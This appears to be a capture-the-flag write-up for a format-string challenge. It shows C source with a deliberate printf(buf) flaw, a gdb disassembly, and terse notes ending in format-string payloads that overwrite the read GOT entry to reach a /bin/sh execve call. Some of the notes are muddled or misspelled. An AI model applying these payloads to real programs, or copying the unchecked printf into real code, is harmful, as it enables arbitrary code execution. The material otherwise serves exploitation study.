### FSB code
```c
#include <stdio.h>
#include <alloca.h>
#include <fcntl.h>

unsigned long long key;
char buf[100];
char buf2[100];

int fsb(char** argv, char** envp){
	char* args[]={"/bin/sh", 0};
	int i;

	char*** pargv = &argv;
	char*** penvp = &envp;
        char** arg;
        char* c;
        for(arg=argv;*arg;arg++) for(c=*arg; *c;c++) *c='\0';
        for(arg=envp;*arg;arg++) for(c=*arg; *c;c++) *c='\0';
	*pargv=0;
	*penvp=0;

	for(i=0; i<4; i++){
		printf("Give me some format strings(%d)\n", i+1);
		read(0, buf, 100);
		printf(buf);
	}

	printf("Wait a sec...\n");
        sleep(3);

        printf("key : \n");
        read(0, buf2, 100);
        unsigned long long pw = strtoull(buf2, 0, 10);
        if(pw == key){
                printf("Congratz!\n");
                execve(args[0], args, 0);
                return 0;
        }

        printf("Incorrect key \n");
	return 0;
}

int main(int argc, char* argv[], char** envp){

	int fd = open("/dev/urandom", O_RDONLY);
	if( fd==-1 || read(fd, &key, 8) != 8 ){
		printf("Error, tell admin\n");
		return 0;
	}
	close(fd);

	alloca(0x12345 & key);

	fsb(argv, envp); // exploit this format string bug!
	return 0;
}


```

### Breakdown of printf routine
```txt
gdb-peda$ pdisass fsb
Dump of assembler code for function fsb:
   0x08048534 <+0>:     push   ebp
   0x08048535 <+1>:     mov    ebp,esp
   0x08048537 <+3>:     sub    esp,0x48
   0x0804853a <+6>:     mov    DWORD PTR [ebp-0x24],0x8048870
   0x08048541 <+13>:    mov    DWORD PTR [ebp-0x20],0x0
   0x08048548 <+20>:    lea    eax,[ebp+0x8]
   0x0804854b <+23>:    mov    DWORD PTR [ebp-0x10],eax
   0x0804854e <+26>:    lea    eax,[ebp+0xc]
   0x08048551 <+29>:    mov    DWORD PTR [ebp-0xc],eax
   0x08048554 <+32>:    mov    eax,DWORD PTR [ebp+0x8]
   0x08048557 <+35>:    mov    DWORD PTR [ebp-0x18],eax
   0x0804855a <+38>:    jmp    0x804857e <fsb+74>
   0x0804855c <+40>:    mov    eax,DWORD PTR [ebp-0x18]
   0x0804855f <+43>:    mov    eax,DWORD PTR [eax]
   0x08048561 <+45>:    mov    DWORD PTR [ebp-0x14],eax
   0x08048564 <+48>:    jmp    0x8048570 <fsb+60>
   0x08048566 <+50>:    mov    eax,DWORD PTR [ebp-0x14]
   0x08048569 <+53>:    mov    BYTE PTR [eax],0x0
   0x0804856c <+56>:    add    DWORD PTR [ebp-0x14],0x1
   0x08048570 <+60>:    mov    eax,DWORD PTR [ebp-0x14]
   0x08048573 <+63>:    movzx  eax,BYTE PTR [eax]
   0x08048576 <+66>:    test   al,al
   0x08048578 <+68>:    jne    0x8048566 <fsb+50>
   0x0804857a <+70>:    add    DWORD PTR [ebp-0x18],0x4
   0x0804857e <+74>:    mov    eax,DWORD PTR [ebp-0x18]
   0x08048581 <+77>:    mov    eax,DWORD PTR [eax]
   0x08048583 <+79>:    test   eax,eax
   0x08048585 <+81>:    jne    0x804855c <fsb+40>
   0x08048587 <+83>:    mov    eax,DWORD PTR [ebp+0xc]
   0x0804858a <+86>:    mov    DWORD PTR [ebp-0x18],eax
   0x0804858d <+89>:    jmp    0x80485b1 <fsb+125>
   0x0804858f <+91>:    mov    eax,DWORD PTR [ebp-0x18]
   0x08048592 <+94>:    mov    eax,DWORD PTR [eax]
   0x08048594 <+96>:    mov    DWORD PTR [ebp-0x14],eax
   0x08048597 <+99>:    jmp    0x80485a3 <fsb+111>
   0x08048599 <+101>:   mov    eax,DWORD PTR [ebp-0x14]
   0x0804859c <+104>:   mov    BYTE PTR [eax],0x0
   0x0804859f <+107>:   add    DWORD PTR [ebp-0x14],0x1
   0x080485a3 <+111>:   mov    eax,DWORD PTR [ebp-0x14]
   0x080485a6 <+114>:   movzx  eax,BYTE PTR [eax]
   0x080485a9 <+117>:   test   al,al
   0x080485ab <+119>:   jne    0x8048599 <fsb+101>
   0x080485ad <+121>:   add    DWORD PTR [ebp-0x18],0x4
   0x080485b1 <+125>:   mov    eax,DWORD PTR [ebp-0x18]
   0x080485b4 <+128>:   mov    eax,DWORD PTR [eax]
   0x080485b6 <+130>:   test   eax,eax
   0x080485b8 <+132>:   jne    0x804858f <fsb+91>
   0x080485ba <+134>:   mov    eax,DWORD PTR [ebp-0x10]
   0x080485bd <+137>:   mov    DWORD PTR [eax],0x0
   0x080485c3 <+143>:   mov    eax,DWORD PTR [ebp-0xc]
   0x080485c6 <+146>:   mov    DWORD PTR [eax],0x0
   0x080485cc <+152>:   mov    DWORD PTR [ebp-0x1c],0x0
   0x080485d3 <+159>:   jmp    0x8048619 <fsb+229>
   0x080485d5 <+161>:   mov    eax,DWORD PTR [ebp-0x1c]
   0x080485d8 <+164>:   lea    edx,[eax+0x1]
   0x080485db <+167>:   mov    eax,0x8048878
   0x080485e0 <+172>:   mov    DWORD PTR [esp+0x4],edx
   0x080485e4 <+176>:   mov    DWORD PTR [esp],eax
   0x080485e7 <+179>:   call   0x80483f0 <printf@plt>
   0x080485ec <+184>:   mov    DWORD PTR [esp+0x8],0x64
   0x080485f4 <+192>:   mov    DWORD PTR [esp+0x4],0x804a100
   0x080485fc <+200>:   mov    DWORD PTR [esp],0x0
   0x08048603 <+207>:   call   0x80483e0 <read@plt>
   0x08048608 <+212>:   mov    eax,0x804a100
   0x0804860d <+217>:   mov    DWORD PTR [esp],eax
   0x08048610 <+220>:   call   0x80483f0 <printf@plt>
   0x08048615 <+225>:   add    DWORD PTR [ebp-0x1c],0x1
   0x08048619 <+229>:   cmp    DWORD PTR [ebp-0x1c],0x3
   0x0804861d <+233>:   jle    0x80485d5 <fsb+161>
   0x0804861f <+235>:   mov    DWORD PTR [esp],0x8048899
   0x08048626 <+242>:   call   0x8048410 <puts@plt>
   0x0804862b <+247>:   mov    DWORD PTR [esp],0x3
   0x08048632 <+254>:   call   0x8048400 <sleep@plt>
   0x08048637 <+259>:   mov    DWORD PTR [esp],0x80488a7
   0x0804863e <+266>:   call   0x8048410 <puts@plt>
   0x08048643 <+271>:   mov    DWORD PTR [esp+0x8],0x64
   0x0804864b <+279>:   mov    DWORD PTR [esp+0x4],0x804a080
   0x08048653 <+287>:   mov    DWORD PTR [esp],0x0
   0x0804865a <+294>:   call   0x80483e0 <read@plt>
   0x0804865f <+299>:   mov    DWORD PTR [esp+0x8],0xa
   0x08048667 <+307>:   mov    DWORD PTR [esp+0x4],0x0
   0x0804866f <+315>:   mov    DWORD PTR [esp],0x804a080
   0x08048676 <+322>:   call   0x8048460 <strtoull@plt>
   0x0804867b <+327>:   mov    edx,eax
   0x0804867d <+329>:   sar    edx,0x1f
   0x08048680 <+332>:   mov    DWORD PTR [ebp-0x30],eax
   0x08048683 <+335>:   mov    DWORD PTR [ebp-0x2c],edx
   0x08048686 <+338>:   mov    eax,ds:0x804a060
   0x0804868b <+343>:   mov    edx,DWORD PTR ds:0x804a064
   0x08048691 <+349>:   mov    ecx,edx
   0x08048693 <+351>:   xor    ecx,DWORD PTR [ebp-0x2c]
   0x08048696 <+354>:   xor    eax,DWORD PTR [ebp-0x30]
   0x08048699 <+357>:   or     eax,ecx
   0x0804869b <+359>:   test   eax,eax
   0x0804869d <+361>:   jne    0x80486cc <fsb+408>
   0x0804869f <+363>:   mov    DWORD PTR [esp],0x80488ae
   0x080486a6 <+370>:   call   0x8048410 <puts@plt>
   0x080486ab <+375>:   mov    eax,DWORD PTR [ebp-0x24]
   0x080486ae <+378>:   mov    DWORD PTR [esp+0x8],0x0
   0x080486b6 <+386>:   lea    edx,[ebp-0x24]
   0x080486b9 <+389>:   mov    DWORD PTR [esp+0x4],edx
   0x080486bd <+393>:   mov    DWORD PTR [esp],eax
   0x080486c0 <+396>:   call   0x8048450 <execve@plt>
   0x080486c5 <+401>:   mov    eax,0x0
   0x080486ca <+406>:   jmp    0x80486dd <fsb+425>
   0x080486cc <+408>:   mov    DWORD PTR [esp],0x80488b8
   0x080486d3 <+415>:   call   0x8048410 <puts@plt>
   0x080486d8 <+420>:   mov    eax,0x0
   0x080486dd <+425>:   leave
   0x080486de <+426>:   ret
End of assembler dump.
```

### Exploit
```txt
%x shows address
%n shows bytes written?
%c shows bytes count
$n writes bytes

Self referencing stack. %14 points to $20, %15 points to %21. writing to the address of the argument (e.g. 14 writes to the address of 20)

Overwrite read GOT with execv
# Read GOT
info func read
0x080483e0 <read@plt+0>:     jmp    DWORD PTR ds:0x804a000

# Integer Values
0x804a000 = read = 134520832
0x080486ab = excecv = 134514347
 
# Format Strings
%134520832c%14$n
%134514347c%20$n

```